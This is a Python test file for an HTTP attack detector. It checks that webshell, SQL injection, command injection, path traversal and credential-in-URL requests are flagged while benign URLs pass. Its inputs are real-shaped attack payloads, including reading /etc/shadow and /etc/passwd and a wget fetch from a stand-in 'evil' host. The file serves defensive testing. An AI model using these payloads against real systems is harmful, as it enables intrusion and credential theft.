"""Tests for HTTP detections. Real attack URIs vs benign traffic (low FP)."""
import http_detect as h


def _dets(**kw):
    return {d for d, _, _, _ in h.http_findings(**kw)}


def test_webshell_uri():
    assert "http_webshell" in _dets(method="GET", url="/uploads/shell.php?cmd=id")
    assert "http_webshell" in _dets(method="GET", url="/images/c99.php")


def test_sqli():
    assert "http_sqli" in _dets(method="GET", url="/item?id=1' or '1'='1")
    assert "http_sqli" in _dets(method="GET", url="/p?q=1 UNION SELECT username,password FROM users")


def test_command_injection():
    assert "http_cmd_injection" in _dets(method="GET", url="/ping?host=8.8.8.8;cat /etc/shadow")
    assert "http_cmd_injection" in _dets(method="GET", url="/x?c=$(wget http://evil/x)")


def test_path_traversal():
    assert "http_path_traversal" in _dets(method="GET", url="/download?f=../../../../etc/passwd")
    assert "http_path_traversal" in _dets(method="GET", url="/view?p=php://filter/convert.base64-encode/resource=index")


def test_cred_in_url():
    assert "http_cred_in_url" in _dets(method="GET", url="/login?user=admin&password=hunter2")


def test_suspicious_method():
    assert "http_suspicious_method" in _dets(method="PUT", url="/webdav/x.jsp")
    assert "http_suspicious_method" in _dets(method="PROPFIND", url="/")


def test_benign_traffic_is_clean():
    for url in ("/", "/index.html", "/api/v1/users?page=2", "/static/app.js",
                "/search?q=how+to+select+a+union+representative",  # 'select'+'union' but not SQLi shape
                "/products?category=shoes&sort=price"):
        assert h.http_findings(method="GET", url=url) == [], f"false positive on {url}"


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
        print(f"ok  {fn.__name__}")
    print(f"\nall {len(fns)} http-detector tests passed")
